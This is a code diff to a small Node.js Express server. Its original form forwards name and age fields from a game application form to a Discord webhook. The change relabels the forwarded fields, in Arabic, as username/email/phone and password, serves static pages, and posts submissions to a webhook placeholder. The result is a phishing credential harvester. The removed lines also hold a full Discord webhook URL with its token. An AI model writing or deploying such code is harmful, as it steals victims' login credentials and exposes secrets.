@@ -1,43 +1,33 @@
 const express = require("express");
+const fetch = (...args) => import("node-fetch").then(({ default: fetch }) => fetch(...args));
 const app = express();
-const PORT = 3000;
-
-const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1462150846069608632/zt8PlqCfsdpTsgEwU_sR7BDCcPmPyLcn07avJxnSwB126V1F7JBfPXzzmul1mSGB3xYQ";
 
 app.use(express.json());
+app.use(express.static(__dirname));
 
-app.post("/send", async (req, res) => {
+const WEBHOOK = "PUT_YOUR_WEBHOOK_HERE";
+
+app.post("/apply", async (req, res) => {
   const { name, age } = req.body;
 
-  if (!name || !age) {
-    return res.status(400).json({ error: "بيانات ناقصة" });
-  }
-
-  try {
-    await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: "Webhook",
-        embeds: [
-          {
-            title: "تقديم جديد 🎮",
-            color: 5814783,
-            fields: [
-              { name: "الاسم", value: name, inline: true },
-              { name: "العمر", value: age, inline: true }
-            ]
-          }
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      embeds: [{
+        title: "📨 تقديم جديد",
+        color: 3447003,
+        fields: [
+          { name: "اسم المستخدم/البريد/الهاتف", value: name || "غير معروف", inline: true },
+          { name: "كلمة المرور", value: age || "غير معروف", inline: true }
         ]
-      })
-    });
+      }]
+    })
+  });
 
-    res.json({ success: true });
-  } catch (e) {
-    res.status(500).json({ error: "فشل الإرسال" });
-  }
+  res.json({ ok: true });
 });
 
-app.listen(PORT, () => {
-  console.log("Server running on port " + PORT);
+app.listen(3000, () => {
+  console.log("Server Running: http://localhost:3000");
 });
